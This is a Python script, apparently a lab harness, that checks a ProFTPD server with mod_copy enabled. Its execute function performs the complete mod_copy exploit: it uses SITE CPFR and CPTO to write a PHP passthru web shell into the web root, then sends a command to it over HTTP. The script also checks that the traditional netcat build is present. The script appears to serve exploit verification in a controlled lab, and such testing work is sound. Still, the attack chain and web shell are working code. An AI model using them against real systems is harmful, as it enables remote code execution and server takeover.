"""Independent FTP, PHP and physical-state controls for the genuine daemon."""
from pathlib import Path
import base64
import ftplib
import importlib.util
import io
import json
import os
import subprocess
import sys
import urllib.parse
import urllib.request

spec = importlib.util.spec_from_file_location('native_metadata', '/opt/native_metadata.py')
shared = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shared)
ROOTS = [Path('/tmp/copy'), Path('/var/www/html/lab')]
FILES = ['/etc/passwd', '/etc/group', '/etc/proftpd/users', '/etc/proftpd/groups',
         '/run/proftpd.conf', '/usr/local/sbin/proftpd', '/var/www/html/foreign.txt',
         '/var/www/html/health.php', '/var/www/html/native.php',
         '/usr/local/share/module-target/proftpd-source', '/usr/local/share/module-target/packages']


def state():
    value = shared.state()
    value['files'] = {name: shared.metadata(Path(name)) for name in FILES}
    value['web'] = {str(path.relative_to(ROOTS[1])): shared.metadata(path)
                    for path in sorted(ROOTS[1].rglob('*'))}
    return value


def artifact(name):
    path = Path(name)
    assert any(path.parent == root for root in ROOTS), name
    assert not path.is_symlink(), name
    return dict(exists=False) if not path.exists() else dict(
        exists=True, **shared.metadata(path), base64=base64.b64encode(path.read_bytes()).decode())


def ftp(authenticated=False):
    connection = ftplib.FTP()
    connection.connect('127.0.0.1', 2121, timeout=5)
    if authenticated:
        connection.login('ftplab', 'module-target-password')
    return connection


def reply(connection, command):
    try:
        return connection.sendcmd(command)
    except (ftplib.error_perm, ftplib.error_temp) as error:
        return str(error)


def prerequisites(version, engine):
    log = dict(version=version, copy_engine=engine)
    try:
        connection = ftp()
        try:
            log['banner'] = connection.getwelcome()
            log['unauthenticated_cpfr'] = reply(connection, 'SITE CPFR /etc/passwd')
        finally:
            connection.close()
        connection = ftp()
        try:
            log['wrong_login'] = reply(connection, 'USER ftplab')
            log['wrong_password'] = reply(connection, 'PASS incorrect-module-target-password')
        finally:
            connection.close()
        path = ROOTS[1] / 'native-normal-ftp'
        connection = ftp(True)
        try:
            log['authenticated_pwd'] = connection.pwd()
            data = b'FTP native control\r\n'
            log['store'] = connection.storbinary('STOR ' + str(path), io.BytesIO(data))
            received = io.BytesIO()
            log['retrieve'] = connection.retrbinary('RETR ' + str(path), received.write)
            log['stored_file'] = artifact(str(path))
            assert received.getvalue() == data
            assert log['stored_file']['uid'] == 33
            log['authenticated_cpfr'] = reply(connection, 'SITE CPFR ' + str(path))
            log['delete'] = connection.delete(str(path))
        finally:
            connection.close()
            if path.exists():
                path.unlink()
        log['source'] = Path('/usr/local/share/module-target/proftpd-source').read_text()
        pins = json.loads(Path('/opt/module-target-proftpd/releases.json').read_text())[version]
        log['modules'] = subprocess.check_output(['/usr/local/sbin/proftpd', '-l'], text=True)
        log['php'] = subprocess.check_output(['php', '-r', 'echo PHP_VERSION;'], text=True)
        log['netcat'] = os.path.realpath('/bin/nc')
        log['tools'] = {name: subprocess.check_output(['which', name], text=True).strip()
                        for name in ['perl', 'python3', 'nc', 'sh', 'nohup']}
        assert 'ProFTPD ' + version + ' Server' in log['banner']
        assert log['wrong_password'].startswith('530 ')
        expected = '500 ' if engine == 'off' else ('350 ' if version == '1.3.5' else '530 ')
        assert log['unauthenticated_cpfr'].startswith(expected)
        assert log['authenticated_cpfr'].startswith('500 ' if engine == 'off' else '350 ')
        assert 'mod_copy.c' in log['modules'] and log['source'].splitlines()[0] == version
        assert log['source'].splitlines()[1] == pins['archive_sha256']
        assert log['source'].splitlines()[2].split()[0] == pins['mod_copy_sha256']
        assert log['netcat'].endswith('/nc.traditional')
        log['native_passed'] = True
        return log
    finally:
        Path('/run/native-prerequisites.json').write_text(json.dumps(log, indent=2) + '\n')


def execute(command, authenticated=False):
    """Exercise the complete procfs-copy chain without Framework code."""
    temporary = ROOTS[0] / ".<?php passthru($_GET['native']);?>"
    website = ROOTS[1] / 'native-copy.php'
    log = dict(authenticated=authenticated, replies=[])
    assert not temporary.exists() and not website.exists()
    connection = ftp(authenticated)
    try:
        for command_line, code in [
            ('SITE CPFR /proc/self/cmdline', '350 '),
            ('SITE CPTO ' + str(temporary), '250 '),
            ('SITE CPFR ' + str(temporary), '350 '),
            ('SITE CPTO ' + str(website), '250 '),
        ]:
            answer = reply(connection, command_line)
            log['replies'].append(dict(command=command_line, reply=answer))
            assert answer.startswith(code), log
        log['temporary'] = artifact(str(temporary))
        log['website'] = artifact(str(website))
        assert log['temporary']['uid'] == log['website']['uid'] == 33
        assert b"<?php passthru($_GET['native']);?>" in website.read_bytes()
        url = 'http://127.0.0.1:8080/lab/native-copy.php?' + urllib.parse.urlencode({'native': command})
        with urllib.request.urlopen(url, timeout=10) as response:
            log['http_status'] = response.status
            log['body_base64'] = base64.b64encode(response.read()).decode()
        assert log['http_status'] == 200
        log['native_passed'] = True
        return log
    finally:
        connection.close()
        for path in [temporary, website]:
            if path.exists():
                path.unlink()
        log['copy_artifacts_removed'] = not temporary.exists() and not website.exists()
        Path('/run/native-execute.json').write_text(json.dumps(log, indent=2) + '\n')


def reset(expected):
    """Remove only the exact captured new files in the two dedicated lab dirs."""
    actual = state()
    assert expected == {key: actual[key] for key in ['tmp', 'web']}
    assert set(actual['tmp']) >= {'copy'}
    for root in ROOTS:
        for path in root.iterdir():
            assert path.is_file() and not path.is_symlink(), str(path)
            path.unlink()
    return state()


def main():
    action, *arguments = sys.argv[1:]
    if action == 'state':
        value = state()
    elif action == 'prerequisites':
        value = prerequisites(*arguments)
    elif action == 'execute':
        value = execute(base64.b64decode(arguments[0]).decode(), len(arguments) > 1 and arguments[1] == 'authenticated')
    elif action == 'file':
        value = artifact(arguments[0])
    elif action == 'process':
        path = Path('/proc', str(int(arguments[0])))
        fields = (path / 'stat').read_text().rsplit(')', 1)[1].split()
        value = dict(pid=int(path.name), uid=path.stat().st_uid, birth=fields[19],
                     argv_base64=base64.b64encode((path / 'cmdline').read_bytes()).decode())
    elif action == 'remove':
        path = Path(arguments[0])
        artifact(str(path))
        if path.exists():
            path.unlink()
        value = artifact(str(path))
    elif action == 'reset':
        value = reset(json.loads(base64.b64decode(arguments[0])))
    else:
        raise ValueError(action)
    print(json.dumps(value))


if __name__ == '__main__':
    main()
